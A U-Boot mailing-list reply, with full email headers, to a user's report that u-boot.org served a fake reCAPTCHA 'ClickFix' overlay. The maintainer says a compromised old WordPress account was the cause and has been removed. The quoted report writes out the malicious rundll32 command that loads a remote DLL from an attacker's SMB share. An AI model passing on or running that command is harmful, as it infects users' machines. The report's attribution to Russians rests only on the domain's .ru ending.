Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 4F976EC1117
	for <u-boot@archiver.kernel.org>; Mon, 23 Feb 2026 17:51:17 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id D68F183D17;
	Mon, 23 Feb 2026 18:51:15 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=chromium.org
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=pass (1024-bit key; unprotected) header.d=chromium.org header.i=@chromium.org header.b="cjnPo9zi";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id B69F780077; Mon, 23 Feb 2026 18:51:14 +0100 (CET)
Received: from mail-ed1-x52d.google.com (mail-ed1-x52d.google.com
 [IPv6:2a00:1450:4864:20::52d])
 (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id B79F583D0F
 for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 18:51:12 +0100 (CET)
Authentication-Results: phobos.denx.de;
 dmarc=pass (p=none dis=none) header.from=chromium.org
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=sjg@chromium.org
Received: by mail-ed1-x52d.google.com with SMTP id
 4fb4d7f45d1cf-65c0e2cbde1so7883853a12.0
 for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 09:51:12 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1771869072; cv=none;
 d=google.com; s=arc-20240605;
 b=AdbI/7abgKK9YDXls7H3+9Sgh6shLaTKDoBdS3qktAFrrX8SIjeCY7uXSwvYyEFGA8
 JbSq++lKhv4XN9oI12dtzTNTXw6JhLZvD9qXF9Qb1vl6RCjMpdz5+gvkSQNwWZ76azA9
 y5xUOS6HeStIarfVUMcK/wLj5knDZ9QiztSrDTKN1w+RdqhWiDAWIGGJB7qaNKYzwGGH
 NMa0pMPyiJkVrPXluMHCtNc62hDDc9YFQwoNa9oyjhbaAZ2VI4MmdMMpxaGxlyXestJJ
 U19k3fNWCyo8LN/ie4789Ia+sgoGwy08z7VHZdR1pS3sMEEleoUrPIgfL8XZPZZ+RqxC
 k7Cw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com;
 s=arc-20240605; 
 h=cc:to:subject:message-id:date:from:in-reply-to:references
 :mime-version:dkim-signature;
 bh=k54HjozvFAN6uH9LDM+MgK/JnuIqzw8sf7sVq+UBn+A=;
 fh=Ueps/vIxjMVD8u4ssgXl06vwE9ME1vWRAyGr7GfWf04=;
 b=Fk3zpWdOU0ZLgYLE0J8bvtZkGdQzR5FowgtqNufpo1NAKLi+DWn7b5rQwouchjza2e
 7VdxUqKNdAj9IjVh+dUktwtHbCqXw7MJeKaSXrV2MAZMKuBN+QVCeBnKF1KPLHAQV6+P
 uyLj27iyWrPx18lNnpB/jI/+AEpmQ66gGq1IOqueaBUQNeWCoF4d3B8/Nwl9chlJJ2VI
 qtXjO+8FP37Vewt3N7/Pr/faTZjCrsFzWtcByB5TR1jZuxhVsH1OJIrEFk9E1BOKr3jI
 U8oTZwyBZdFL7D+OB6RcVu1XJcoRxR2N8BqozFFQh2OeGrAEfbX1wPDxlv+VZdTaVaaY
 OxSA==; darn=lists.denx.de
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=chromium.org; s=google; t=1771869072; x=1772473872; darn=lists.denx.de;
 h=cc:to:subject:message-id:date:from:in-reply-to:references
 :mime-version:from:to:cc:subject:date:message-id:reply-to;
 bh=k54HjozvFAN6uH9LDM+MgK/JnuIqzw8sf7sVq+UBn+A=;
 b=cjnPo9zi3uZ9eSPKD5l/Y+xBD1Ib3EzTiNEGX2B5qBY9PqyCefsWCvgIqw6+uqKVlE
 rm7KlQwhn4GRHcoglFKYW4kpXLnyGLfyWWq3J0cJeS564tqcG9vyqR/VDzQ0Jl4tmGaz
 j/m2R0xdJxu+LMCwzxbBKk0PUa55+ENZSGSWw=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20230601; t=1771869072; x=1772473872;
 h=cc:to:subject:message-id:date:from:in-reply-to:references
 :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
 :message-id:reply-to;
 bh=k54HjozvFAN6uH9LDM+MgK/JnuIqzw8sf7sVq+UBn+A=;
 b=PNhQdj14nUf6+ccVxYLn+Jqq3Fllymu1kB117yaU78REY2X4/n8Dey1YC4+hKXUfNs
 W6VQX9qz59FP2yKUmeCqwEM9aZmaHepsWTZxNrq4ssZTV69IjcM5mpBd98etrQpT89/p
 dLAUjCoMHMs7SRFVgLFSbkyDWXaXlIA4PNcD2Yd+4REC3Cz6Z+sXnCXPoSxcxur934/l
 q+6N97nSlUOce91Jl5RV48pkpV6gza2R2wTBHoJc2tVsTvh3cmmP5dbK+zUqknqiDD+9
 hoeTaSo9rs+1S/HczD9Y6bRvDgTFU14rdtEOcGLSdrhMR8h1F0ERzf6ypHpS7J092hUh
 4TiA==
X-Forwarded-Encrypted: i=1;
 AJvYcCXAg1/ShvcfoiK7cPZHC1vMhVN8ki/gZvvcPI850XQC5U52H4bFwPMyzEDfC/aXddyLnD2VnwQ=@lists.denx.de
X-Gm-Message-State: AOJu0YyYjkxZbznhxPz79xpidHEA2q9bZgiz1tq0fokss5LzLth8v/5Q
 amNZrkQea1F8GX4Z4CmeLqUmujGQOm9C02cy50r5+aqNmBwsqyDTKXZp/vs+DvvWgTl6ASv3dBB
 cF01qXqGMcRFsc1R/veB6t6WK/YuLRkCSEX3VVIBc
X-Gm-Gg: ATEYQzzP25k/sFvvc5CFbFUJwRy7KKsTFj6b0R0aPqLXxRBAf6F2CoeY/HlCO+bTq3G
 3O81HouoWzeW0j/iIuADxIHmSB5O3Xne0x6oqPNL7H2JIBOz3MIRcuaueYgfrIPdRIn52oUjg/a
 Td45GlKOo3WfzDP7KqBW9XmFecgGEQJjKWQLdNRUns28jafigw6dvQqFTlGrF6wWHEAdsUmFcNr
 g60842inzfsNlmNalgpGtErHExovQV3u+9PCIwpfnqG7EFSNlEYQfmsB6FO9PZLjzTVzV7I483W
 /mLgcw==
X-Received: by 2002:a05:6402:34d5:b0:65c:64a:2164 with SMTP id
 4fb4d7f45d1cf-65ea4ee7b62mr5984021a12.12.1771869072160; Mon, 23 Feb 2026
 09:51:12 -0800 (PST)
MIME-Version: 1.0
References: <CAOtRsiobsWdniw01Fi0JjaD4poZ7qLHNCdTY0O4Zz0gsVchuiA@mail.gmail.com>
In-Reply-To: <CAOtRsiobsWdniw01Fi0JjaD4poZ7qLHNCdTY0O4Zz0gsVchuiA@mail.gmail.com>
From: Simon Glass <sjg@chromium.org>
Date: Mon, 23 Feb 2026 10:50:57 -0700
X-Gm-Features: AaiRm51CIPr6qO2MFmcC4up7JJWD8FT2-3al-x4OcrWyRwz5G_Aay_TpDCr829M
Message-ID: <CAFLszTgcfpciTQ7TngKxiP=vSWRknfv9CC_3MyyZ62AC7ZKTkQ@mail.gmail.com>
Subject: Re: Malicious CAPTCHA Popup
To: zayn beedooles <gb5463348@gmail.com>
Cc: trini@konsulko.com, u-boot@lists.denx.de
Content-Type: text/plain; charset="UTF-8"
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

Hi Zayn,

On Mon, 23 Feb 2026 at 03:02, zayn beedooles <gb5463348@gmail.com> wrote:
>
> I am reporting u-boot.org for hosting a "ClickFix" malware attack. The site
> uses a fake Google reCAPTCHA overlay to trick users into running a
> malicious command via the Windows Run dialog.
>
> *Malicious Command:* rundll32.exe \\hill-side-view-point.freshhill.ru
> \service\verification.google,#1
>
> The command uses rundll32.exe to execute a remote DLL from a Russian SMB
> share, bypassing browser sandboxing. HAR logs confirm the site is
> compromised and injecting these scripts into the user's session. This is a
> high-risk social engineering attack targeting developers.
>
> First, it tells the user to run this in the Run dialog to "continue" using
> the website, but it gives the hacker control. It uses the legitimate
> Windows `rundll32.exe` utility to execute code outside the browser's safe
> "sandbox".
> The command points to a remote SMB share on the Russian domain `
> hill-side-view-point.freshhill.ru`*
> It attempts to load and run a malicious DLL disguised as `
> verification.google`, likely an infostealer or ransomware.
>
> I don't know if this may be the wrong person, but I have already reported
> the malware and your website to prevent more victims from getting hacked by
> Russians. How do I know? "hill-side-view-point.freshhill.ru", it ends with
> ".ru". Thank you and have a good day.

Thanks for the report. An old wordpress account was compromised. It
has been deleted and various measures have been put in place to ensure
there is no repeat. We can share more detail privately to those
interested.

Regards,
Simon
